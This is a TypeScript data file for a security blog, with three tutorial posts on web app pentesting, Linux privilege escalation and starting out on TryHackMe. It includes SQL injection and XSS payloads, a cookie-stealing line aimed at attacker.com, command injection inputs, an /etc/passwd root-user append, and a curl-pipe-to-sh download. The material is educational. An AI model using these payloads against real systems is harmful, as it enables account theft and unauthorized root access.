export interface BlogPost {
  slug: string;
  title: string;
  description: string;
  author: string;
  date: string;
  readTime: string;
  content: string;
  tags: string[];
  featured?: boolean;
}

const posts: BlogPost[] = [
  {
    slug: 'web-app-penetration-testing',
    title: 'Web Application Penetration Testing Basics',
    description: 'Learn the fundamentals of web application security testing and common vulnerabilities',
    author: 'Verve Team',
    date: '2024-01-25',
    readTime: '8 min read',
    tags: ['Web Security', 'OWASP', 'Pentesting'],
    featured: false,
    content: `# Web Application Penetration Testing Basics

Web applications are a common target for attackers. Understanding how to test them is essential for any security professional.

## The OWASP Top 10

The OWASP Top 10 is a standard awareness document for web application security. Key vulnerabilities include:

1. **Injection** - SQL, NoSQL, OS command injection
2. **Broken Authentication** - Session management flaws
3. **Sensitive Data Exposure** - Inadequate protection
4. **XML External Entities (XXE)** - XML processor vulnerabilities
5. **Broken Access Control** - Authorization issues
6. **Security Misconfiguration** - Default settings, verbose errors
7. **Cross-Site Scripting (XSS)** - Client-side injection
8. **Insecure Deserialization** - Remote code execution
9. **Using Components with Known Vulnerabilities** - Outdated libraries
10. **Insufficient Logging & Monitoring** - Delayed breach detection

## Testing Methodology

### 1. Information Gathering

\`\`\`bash
# Subdomain enumeration
subfinder -d target.com
amass enum -d target.com

# Technology detection
whatweb https://target.com
wappalyzer
\`\`\`

### 2. Vulnerability Scanning

\`\`\`bash
# Nikto scan
nikto -h https://target.com

# Directory brute forcing
gobuster dir -u https://target.com -w /path/to/wordlist.txt
\`\`\`

### 3. Manual Testing

Focus on business logic, authentication, and authorization flaws that automated tools miss.

## Common Vulnerabilities

### SQL Injection

\`\`\`sql
-- Test for SQL injection
' OR '1'='1
admin' --
' UNION SELECT NULL--

-- Extract data
' UNION SELECT username, password FROM users--
\`\`\`

### Cross-Site Scripting (XSS)

\`\`\`javascript
// Reflected XSS test
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>

// Stored XSS
<script>fetch('http://attacker.com?c='+document.cookie)</script>
\`\`\`

### Command Injection

\`\`\`bash
# Test for command injection
; ls -la
| whoami
\`cat /etc/passwd\`
\`\`\`

## Essential Tools

- **Burp Suite** - Web proxy and scanner
- **OWASP ZAP** - Free alternative to Burp
- **SQLMap** - Automated SQL injection tool
- **ffuf** - Fast web fuzzer
- **Nuclei** - Template-based scanner

## Practice Platforms

- **PortSwigger Web Security Academy** - Free labs
- **OWASP WebGoat** - Deliberately insecure application
- **TryHackMe** - Web security rooms
- **HackTheBox** - Vulnerable web applications

---

*Always get proper authorization before testing any web application!*`
  },
  {
    slug: 'linux-privilege-escalation-guide',
    title: 'Linux Privilege Escalation Guide',
    description: 'Comprehensive guide to understanding and exploiting Linux privilege escalation vulnerabilities',
    author: 'Verve Team',
    date: '2024-01-20',
    readTime: '10 min read',
    tags: ['Linux', 'PrivEsc', 'Security'],
    featured: true,
    content: `# Linux Privilege Escalation Guide

Privilege escalation is a critical skill in penetration testing. This guide covers essential techniques for escalating privileges on Linux systems.

## Understanding Privilege Escalation

Privilege escalation occurs when a user gains access to resources they normally wouldn't have access to, typically by exploiting a vulnerability or misconfiguration.

### Types of Privilege Escalation

- **Vertical** - Gaining higher privileges (user → root)
- **Horizontal** - Accessing another user's resources

## Enumeration

The first step is always enumeration. Gather as much information as possible:

\`\`\`bash
# System information
uname -a
cat /etc/issue
cat /etc/*-release

# Current user info
id
whoami
groups

# Check sudo permissions
sudo -l

# Find SUID binaries
find / -perm -u=s -type f 2>/dev/null
\`\`\`

## Common Techniques

### 1. SUID Binaries

SUID binaries run with the permissions of their owner, not the user executing them.

\`\`\`bash
# Find SUID files
find / -user root -perm -4000 -exec ls -ldb {} \\; 2>/dev/null

# Check GTFOBins for exploitation methods
\`\`\`

### 2. Sudo Misconfigurations

\`\`\`bash
# Check what you can run with sudo
sudo -l

# Look for entries without password requirement
# Look for wildcards or dangerous binaries
\`\`\`

### 3. Kernel Exploits

\`\`\`bash
# Find kernel version
uname -r

# Search for exploits
searchsploit linux kernel 4.15
\`\`\`

### 4. Writable /etc/passwd

\`\`\`bash
# Check if writable
ls -la /etc/passwd

# If writable, add a new root user
openssl passwd -1 -salt xyz password123
echo 'newroot:HASH:0:0:root:/root:/bin/bash' >> /etc/passwd
\`\`\`

## Automated Tools

- **LinPEAS** - Linux Privilege Escalation Awesome Script
- **LinEnum** - Linux enumeration script
- **Linux Smart Enumeration (LSE)** - Another great enumeration tool

\`\`\`bash
# Download and run LinPEAS
curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh
\`\`\`

## Best Practices

1. **Always enumerate thoroughly** - Don't rush
2. **Document everything** - Keep notes of what you find
3. **Understand the exploit** - Don't just run scripts
4. **Clean up after yourself** - Remove artifacts in real assessments

## Resources

- [GTFOBins](https://gtfobins.github.io/) - SUID exploitation techniques
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings) - Comprehensive resource
- [HackTricks](https://book.hacktricks.xyz/) - Pentesting wiki

---

*Practice these techniques in legal environments like TryHackMe and HackTheBox!*`
  },
  {
    slug: 'getting-started-with-tryhackme',
    title: 'Getting Started with TryHackMe',
    description: "A beginner's guide to starting your cybersecurity journey with TryHackMe platform",
    author: 'Verve Team',
    date: '2024-01-15',
    readTime: '5 min read',
    tags: ['TryHackMe', 'Beginner', 'Tutorial'],
    featured: true,
    content: `# Getting Started with TryHackMe

TryHackMe is an excellent platform for learning cybersecurity through hands-on practice. This guide will help you get started.

## What is TryHackMe?

TryHackMe is a free online platform for learning cybersecurity using real-world scenarios. It provides:

- Interactive rooms and challenges
- Virtual machines in your browser
- Learning paths for different skill levels
- Community support

## Setting Up Your Account

1. Visit [tryhackme.com](https://tryhackme.com)
2. Create a free account
3. Choose your learning path
4. Start with beginner rooms

## First Steps

### 1. Complete the Tutorial Room

Start with the "Welcome" room to understand the platform basics.

\`\`\`bash
# Connect to OpenVPN
sudo openvpn your-config.ovpn
\`\`\`

### 2. Learn the Basics

Focus on these fundamental topics:
- Linux basics
- Networking fundamentals
- Web application security
- Privilege escalation

## Tips for Success

- **Take notes** - Document your findings
- **Be consistent** - Practice regularly
- **Join the community** - Discord and forums are helpful
- **Write walkthroughs** - Teaching others solidifies your knowledge

## Recommended Learning Path

1. Complete Basics (2-3 weeks)
2. Easy CTF challenges (1 month)
3. Medium difficulty rooms (2-3 months)
4. Advanced topics (ongoing)

---

*Ready to start your journey? Head over to TryHackMe and begin learning!*`
  }
];

// Sort posts by date (newest first)
const allPosts = posts.sort((a, b) => new Date(b.date).getTime() - new Date(a.date).getTime());

export const getPostBySlug = (slug: string): BlogPost | undefined => {
  return allPosts.find((post) => post.slug === slug);
};

export const getAllPosts = (): BlogPost[] => {
  return allPosts;
};

export const getPostsByTag = (tag: string): BlogPost[] => {
  return allPosts.filter((post) => post.tags.includes(tag));
};

export const getAllTags = (): string[] => {
  const tags = new Set<string>();
  allPosts.forEach((post) => {
    post.tags.forEach((tag) => tags.add(tag));
  });
  return Array.from(tags).sort();
};

export const searchPosts = (query: string): BlogPost[] => {
  const lowerQuery = query.toLowerCase();
  return allPosts.filter(
    (post) =>
      post.title.toLowerCase().includes(lowerQuery) ||
      post.description.toLowerCase().includes(lowerQuery) ||
      post.tags.some((tag) => tag.toLowerCase().includes(lowerQuery))
  );
};
